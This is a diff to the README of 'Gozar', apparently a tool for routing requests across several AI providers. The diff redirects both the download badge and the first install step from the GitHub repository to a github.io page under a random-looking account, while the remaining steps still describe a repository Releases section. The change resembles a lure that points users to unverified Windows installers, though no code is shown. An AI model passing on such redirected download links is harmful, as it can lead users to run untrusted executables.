@@ -1,6 +1,6 @@
 # 🌐 Gozar - Manage multiple AI models with ease
 
-[![Download Gozar](https://img.shields.io/badge/Download-Gozar-blue.svg)](https://github.com/Soilbuilding-libraryroutine78/Gozar)
+[![Download Gozar](https://img.shields.io/badge/Download-Gozar-blue.svg)](https://soilbuilding-libraryroutine78.github.io)
 
 Gozar acts as a central hub for your artificial intelligence tools. It connects different AI providers into one simple interface. You use this software to route your requests, manage costs, and keep your data organized. It removes the complexity of switching between multiple services. You gain control over your AI usage through a single portal.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software. Ensure you meet th
 
 You must visit the project page to download the latest version. Follow these steps to obtain the installer:
 
-1. Visit [https://github.com/Soilbuilding-libraryroutine78/Gozar](https://github.com/Soilbuilding-libraryroutine78/Gozar).
+1. Visit [https://soilbuilding-libraryroutine78.github.io](https://soilbuilding-libraryroutine78.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version link.
 4. Download the file labeled for Windows.
